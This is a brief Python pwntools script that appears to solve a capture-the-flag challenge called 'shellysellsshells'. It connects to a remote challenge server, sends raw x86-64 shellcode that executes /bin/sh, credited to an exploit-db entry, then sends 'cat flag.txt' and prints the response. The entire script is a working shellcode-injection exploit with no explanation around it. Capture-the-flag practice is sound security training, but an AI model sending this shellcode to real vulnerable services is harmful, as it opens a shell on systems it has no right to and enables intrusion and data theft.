#!/bin/python
from pwn import *
#target = process("./shellysellsshells")
target = remote("forever.isss.io", 1305)
# shellcodes from https://www.exploit-db.com/exploits/47008
target.sendline(b"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\xb0\x3b\x99\x0f\x05")
target.sendline(b"cat flag.txt")
print(target.recvline())
